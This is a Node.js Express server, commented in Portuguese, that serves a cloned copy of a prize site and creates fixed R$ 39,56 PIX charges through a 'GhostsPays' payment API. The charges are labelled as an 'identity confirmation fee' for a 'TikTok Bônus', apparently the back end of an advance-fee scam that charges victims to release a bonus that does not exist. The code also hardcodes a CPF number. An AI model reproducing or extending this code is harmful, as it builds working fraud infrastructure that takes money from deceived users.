const express = require('express');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const GHOSTSPAY_SECRET_KEY = process.env.GHOSTSPAY_SECRET_KEY || '';
const GHOSTSPAY_COMPANY_ID = process.env.GHOSTSPAY_COMPANY_ID || '';
const GHOSTSPAY_POSTBACK_URL = process.env.GHOSTSPAY_POSTBACK_URL || '';
const GHOSTSPAY_BASE_URL = 'https://api.ghostspaysv2.com/functions/v1';

if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
  console.warn(
    '[GhostsPays] Atenção: defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID no .env para habilitar a criação real de pagamentos.'
  );
}

app.use(express.json());

// Servir o clone estático (mantendo estrutura atual)
const staticRoot = path.join(__dirname, 'clones', 'premiaon.vercel.app');
app.use(express.static(staticRoot));

function buildAuthHeader() {
  const credentials = Buffer.from(`${GHOSTSPAY_SECRET_KEY}:${GHOSTSPAY_COMPANY_ID}`).toString('base64');
  return `Basic ${credentials}`;
}

async function callGhostsPays(endpoint, options) {
  const url = `${GHOSTSPAY_BASE_URL}${endpoint}`;
  const resp = await fetch(url, options);
  const text = await resp.text();
  let json;
  try {
    json = text ? JSON.parse(text) : null;
  } catch (e) {
    json = { raw: text };
  }
  return { status: resp.status, body: json };
}

// Cria um pagamento PIX fixo para a taxa de confirmação (R$ 39,56) usando CPF 11238990533
app.post('/api/ghostspay/pix-taxa', async (req, res) => {
  if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
    return res.status(500).json({
      error: {
        code: 'MISSING_CREDENTIALS',
        message: 'Configuração GhostsPays ausente. Defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID.'
      }
    });
  }

  const cpfNumero = '11238990533';
  const amount = 3956; // R$ 39,56 em centavos

  const payload = {
    customer: {
      name: 'CPF 112.389.905-33',
      email: 'cpf11238990533@example.com',
      phone: '11999999999',
      document: {
        number: cpfNumero,
        type: 'CPF'
      }
    },
    paymentMethod: 'PIX',
    amount,
    items: [
      {
        title: 'Taxa de confirmação de identidade',
        unitPrice: amount,
        quantity: 1
      }
    ],
    pix: {
      expiresInDays: 1
    },
    description: 'Taxa de confirmação TikTok Bônus',
    metadata: {
      flow: 'tiktok_bonus',
      cpf: cpfNumero,
      chavePix: cpfNumero
    }
  };

  if (GHOSTSPAY_POSTBACK_URL) {
    payload.postbackUrl = GHOSTSPAY_POSTBACK_URL;
  }

  try {
    const { status, body } = await callGhostsPays('/transactions', {
      method: 'POST',
      headers: {
        Authorization: buildAuthHeader(),
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    res.status(status).json(body);
  } catch (e) {
    console.error('[GhostsPays] Erro ao criar pagamento PIX:', e);
    res.status(500).json({
      error: {
        code: 'INTERNAL_ERROR',
        message: 'Falha ao comunicar com a API GhostsPays.'
      }
    });
  }
});

// Consulta de status de uma transação (usado opcionalmente pelo fluxo "Já paguei")
app.get('/api/ghostspay/transactions/:id', async (req, res) => {
  if (!GHOSTSPAY_SECRET_KEY || !GHOSTSPAY_COMPANY_ID) {
    return res.status(500).json({
      error: {
        code: 'MISSING_CREDENTIALS',
        message: 'Configuração GhostsPays ausente. Defina GHOSTSPAY_SECRET_KEY e GHOSTSPAY_COMPANY_ID.'
      }
    });
  }

  const id = req.params.id;
  try {
    const { status, body } = await callGhostsPays(`/transactions/${id}`, {
      method: 'GET',
      headers: {
        Authorization: buildAuthHeader()
      }
    });
    res.status(status).json(body);
  } catch (e) {
    console.error('[GhostsPays] Erro ao consultar transação:', e);
    res.status(500).json({
      error: {
        code: 'INTERNAL_ERROR',
        message: 'Falha ao comunicar com a API GhostsPays.'
      }
    });
  }
});

// Fallback para servir a página principal caso acessem rotas desconhecidas via navegador
app.get('*', (req, res) => {
  res.sendFile(path.join(staticRoot, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});

